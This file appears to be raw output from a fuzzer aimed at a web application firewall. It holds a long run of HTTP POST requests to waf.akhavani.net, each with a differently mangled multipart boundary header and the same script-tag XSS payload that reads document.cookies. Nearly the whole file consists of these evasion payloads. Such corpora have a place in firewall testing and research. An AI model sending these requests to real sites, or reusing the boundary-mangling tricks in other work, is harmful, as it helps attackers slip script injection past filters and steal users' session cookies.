POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 858\r\nContent-Type: multipart/form-data; bo;undaryboundar0bonda\x03ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 922\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 986\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 30\r\nContent-Type: multipart/form-data; NounaryboundDary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 94\r\nContent-Type: multipart/form-data; boundary7oundaLrybounnar,;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 158\r\nContent-Type: multipart/form-data; ===bYoundary=boundarybounaVQ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 222\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 286\r\nContent-Type: multipart/form-data; \x11o)undaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 350\r\nContent-Type: multipart/form-data; =bo\xc2\xbbtundary===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 414\r\nContent-Type: multipart/form-data; bo uNdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 478\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 542\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 606\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 670\r\nContent-Type: multipart/form-data; bu$na\x11ryB\x07oundarybondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 734\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 798\r\nContent-Type: multipart/form-data; \x7fbounda\x1d\x12boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 862\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 926\r\nContent-Type: multipart/form-data; bo_u?nd\x07ary=bund8aryZboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 990\r\nContent-Type: multipart/form-data; ==boundarA=boundaryO*Doundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 10\r\nContent-Type: multipart/form-data; ==5bundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 74\r\nContent-Type: multipart/form-data; boundaryboundary=bound\x0fry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 138\r\nContent-Type: multipart/form-data; bon\x1aay=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 202\r\nContent-Type: multipart/form-data; bou;da8=bouodary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 266\r\nContent-Type: multipart/form-data; boundary=b9oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 330\r\nContent-Type: multipart/form-data; bousdarboundary=boundaGyou\x0fndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 394\r\nContent-Type: multipart/form-data; ===bounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 458\r\nContent-Type: multipart/form-data; boundary=b\x0bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 522\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 586\r\nContent-Type: multipart/form-data; ound|\x0ey==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 650\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 714\r\nContent-Type: multipart/form-data; =boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 778\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 842\r\nContent-Type: multipart/form-data; bundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 906\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 970\r\nContent-Type: multipart/form-data; boudary=b\x18ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 17\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 81\r\nContent-Type: multipart/form-data; bound\x17aryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 145\r\nContent-Type: multipart/form-data; boun\x0earyound"sr;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 209\r\nContent-Type: multipart/form-data; boundRyboundarybonrB;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 273\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 337\r\nContent-Type: multipart/form-data; bound^aryboundarybouniary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 401\r\nContent-Type: multipart/form-data; boundaryboundary&bund\x17ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 465\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 529\r\nContent-Type: multipart/form-data; boundarybound7,4ry==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 593\r\nContent-Type: multipart/form-data; \x16Uun\x04da[ry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 657\r\nContent-Type: multipart/form-data; bounY%ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 721\r\nContent-Type: multipart/form-data; boundary=bound=r\x12;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 785\r\nContent-Type: multipart/form-data; boundarybotndart9oundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 849\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 913\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 977\r\nContent-Type: multipart/form-data; b%ou\x0fdahry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 23\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 87\r\nContent-Type: multipart/form-data; boundpary=bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 151\r\nContent-Type: multipart/form-data; b;\x16Joundary=b-dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 215\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 279\r\nContent-Type: multipart/form-data; \xc2\xbbboundarub[undaryboundarzy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 343\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 407\r\nContent-Type: multipart/form-data; bbouda\x07ybounda\tr\x0fy=bo`nd|aryboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 471\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 535\r\nContent-Type: multipart/form-data; =bounda\x12y=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 599\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 663\r\nContent-Type: multipart/form-data; ===oundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 727\r\nContent-Type: multipart/form-data; Youndaryboundary\x03oucdarny;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 791\r\nContent-Type: multipart/form-data; =!boundary=ouqndbrG;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 855\r\nContent-Type: multipart/form-data; bundarby=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 919\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 983\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 41\r\nContent-Type: multipart/form-data; bondaay=boundary\x0foundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 105\r\nContent-Type: multipart/form-data; bNynd%ryboundarpyboundariy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 169\r\nContent-Type: multipart/form-data; boun\xc2\xabdaryboundarybCundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 233\r\nContent-Type: multipart/form-data; `bopndavry=junary=oudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 297\r\nContent-Type: multipart/form-data; boundaryb\x15ouFda\x05rybound\x06r;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 361\r\nContent-Type: multipart/form-data; boundary==bou{dar=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 425\r\nContent-Type: multipart/form-data; Qou/dar\x18bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 489\r\nContent-Type: multipart/form-data; boundary=\x06kundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 553\r\nContent-Type: multipart/form-data; ounarybou\\ndaroundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 617\r\nContent-Type: multipart/form-data; =bond\x10ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 681\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 745\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 809\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 873\r\nContent-Type: multipart/form-data; boundary=bounf/ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 937\r\nContent-Type: multipart/form-data; bo/u\x08dary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 2\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 66\r\nContent-Type: multipart/form-data; bouddary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 130\r\nContent-Type: multipart/form-data; bondarbound\xc2\xbb\nary=bGoun\x02d\x1ery;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 194\r\nContent-Type: multipart/form-data; bYundarybogFdarwy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 258\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 322\r\nContent-Type: multipart/form-data; bo\'undaryboundaryboukdry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 386\r\nContent-Type: multipart/form-data; boundarybundaryblufndr5y=bodary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 450\r\nContent-Type: multipart/form-data; bo2undary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 514\r\nContent-Type: multipart/form-data; boundarybouIary=boundarmy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 578\r\nContent-Type: multipart/form-data; b\x7foundary=boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 642\r\nContent-Type: multipart/form-data; boundaryboundary=\x0bounQ0ay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 706\r\nContent-Type: multipart/form-data; boundaryb\r{unary"oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 770\r\nContent-Type: multipart/form-data; bou]daryboundarybound0ry=boudar\x12y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
